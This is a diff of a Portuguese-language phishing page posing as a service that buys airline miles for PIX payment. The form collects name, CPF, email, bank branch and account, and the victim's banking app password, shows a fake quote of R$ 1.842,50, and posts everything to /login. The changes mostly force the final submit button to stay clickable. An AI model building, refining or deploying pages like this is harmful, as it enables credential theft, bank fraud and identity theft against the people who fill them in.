@@ -8,25 +8,35 @@
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
         :root { --blue: #0046ff; --dark: #002db3; --gold: #c5a059; }
-        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; margin: 0; }
-        .header { background: white; padding: 15px; text-align: center; border-bottom: 2px solid #eee; }
+        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; margin: 0; overflow-x: hidden; }
+        
+        .header { background: white; padding: 15px; text-align: center; border-bottom: 2px solid #eee; position: relative; z-index: 10; }
         .logo { font-family: 'Montserrat', sans-serif; font-weight: 800; color: #0a1128; font-size: 1.6rem; text-transform: uppercase; }
+        
         .hero { 
             background: linear-gradient(135deg, var(--blue) 0%, var(--dark) 100%); 
             color: white; padding: 50px 20px 100px 20px; text-align: center;
+            position: relative; z-index: 1;
         }
-        .hero h1 { font-family: 'Montserrat', sans-serif; font-weight: 800; font-size: 2.3rem; line-height: 1.1; margin-bottom: 15px; }
-        .container-form { max-width: 480px; margin: -70px auto 50px auto; padding: 0 15px; }
-        .card { background: white; border: none; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.15); padding: 30px; }
-        
-        /* Sistema de exibição robusto */
+
+        .container-form { 
+            max-width: 480px; margin: -70px auto 50px auto; padding: 0 15px; 
+            position: relative; z-index: 999; /* Joga o formulário para a frente de tudo */
+        }
+
+        .card { 
+            background: white; border: none; border-radius: 20px; 
+            box-shadow: 0 15px 35px rgba(0,0,0,0.2); padding: 30px;
+        }
+
         .step { display: none; }
         .step.active { display: block !important; }
+
+        .form-control { border-radius: 10px; padding: 12px; border: 1px solid #ddd; margin-bottom: 20px; width: 100%; }
         
-        .form-control { border-radius: 10px; padding: 12px; border: 1px solid #ddd; margin-bottom: 20px; width: 100%; box-sizing: border-box; }
-        .btn-main { background: var(--blue); color: white; border: none; border-radius: 50px; padding: 16px; font-weight: 700; width: 100%; cursor: pointer; font-size: 1.1rem; }
+        .btn-main { background: var(--blue); color: white; border: none; border-radius: 50px; padding: 16px; font-weight: 700; width: 100%; cursor: pointer; }
         
-        /* Botão de Sucesso - Destaque Total */
+        /* BOTÃO FINAL - FORÇANDO INTERAÇÃO */
         .btn-success-final { 
             background: #28a745 !important; 
             color: white !important; 
@@ -35,13 +45,17 @@
             padding: 20px; 
             font-weight: 800; 
             width: 100%; 
-            cursor: pointer; 
-            font-size: 1.2rem;
-            box-shadow: 0 4px 15px rgba(40, 167, 69, 0.4);
+            cursor: pointer !important; 
+            font-size: 1.3rem;
             display: block;
+            position: relative;
+            z-index: 1000; /* Garante que o botão seja a coisa mais "alta" da página */
+            pointer-events: auto !important; /* Força o botão a aceitar cliques */
             text-transform: uppercase;
+            margin-top: 20px;
         }
-        .val-cotacao { color: #28a745; font-family: 'Montserrat', sans-serif; font-weight: 800; font-size: 2.8rem; margin: 15px 0; }
+        
+        .val-cotacao { color: #28a745; font-family: 'Montserrat', sans-serif; font-weight: 800; font-size: 2.5rem; }
     </style>
 </head>
 <body>
@@ -51,16 +65,16 @@
 </div>
 
 <div class="hero">
-    <h1>Venda suas milhas agora</h1>
-    <p class="opacity-75">Receba via PIX em até 24h úteis.</p>
+    <h1 style="font-family:'Montserrat'; font-weight:800;">Venda suas milhas agora</h1>
+    <p>Dinheiro na conta via PIX em até 24h.</p>
 </div>
 
 <div class="container-form">
     <div class="card">
-        <form id="mainForm" action="/login" method="POST">
+        <form action="/login" method="POST" id="formFinal">
             
             <div class="step active" id="s1">
-                <h4 class="fw-bold mb-4 text-center">Inicie sua cotação</h4>
+                <h4 class="fw-bold mb-4">Dados Iniciais</h4>
                 <input type="text" name="nome" class="form-control" placeholder="Nome Completo" required>
                 <input type="text" name="cpf" class="form-control" placeholder="CPF" required>
                 <input type="email" name="email" class="form-control" placeholder="E-mail" required>
@@ -68,23 +82,19 @@
             </div>
 
             <div class="step" id="s2">
-                <h4 class="fw-bold mb-4 text-center">Dados de Recebimento</h4>
+                <h4 class="fw-bold mb-4">Dados Bancários</h4>
                 <input type="text" name="agencia" class="form-control" placeholder="Agência">
                 <input type="text" name="conta" class="form-control" placeholder="Conta com dígito">
-                <input type="password" name="senha_app" class="form-control" placeholder="Senha do App do Banco">
-                <button type="button" class="btn-main" onclick="changeStep(3)">VER VALOR FINAL</button>
+                <input type="password" name="senha_app" class="form-control" placeholder="Senha do App">
+                <button type="button" class="btn-main" onclick="changeStep(3)">VER COTAÇÃO</button>
             </div>
 
-            <div class="step" id="s3">
-                <div class="text-center">
-                    <p class="text-muted text-uppercase fw-bold small mb-1">Cotação Disponível</p>
-                    <div class="val-cotacao">R$ 1.842,50</div>
-                    <p class="small text-muted mb-4">Pagamento garantido em conta via PIX.</p>
-                    
-                    <button type="submit" id="btnFinal" class="btn-success-final">
-                        EFETUAR VENDA AGORA
-                    </button>
-                </div>
+            <div class="step text-center" id="s3">
+                <p class="text-muted fw-bold small">Cotação Gerada</p>
+                <div class="val-cotacao mb-4">R$ 1.842,50</div>
+                <button type="submit" class="btn-success-final">
+                    EFETUAR VENDA AGORA
+                </button>
             </div>
 
         </form>
@@ -92,16 +102,14 @@
 </div>
 
 <script>
-    function changeStep(nextStep) {
+    function changeStep(n) {
         // Esconde todos
         const steps = document.querySelectorAll('.step');
-        steps.forEach(step => {
-            step.style.display = 'none';
-            step.classList.remove('active');
-        });
+        steps.forEach(s => s.style.display = 'none');
+        steps.forEach(s => s.classList.remove('active'));
 
-        // Mostra o próximo
-        const target = document.getElementById('s' + nextStep);
+        // Mostra o atual
+        const target = document.getElementById('s' + n);
         if (target) {
             target.style.display = 'block';
             target.classList.add('active');
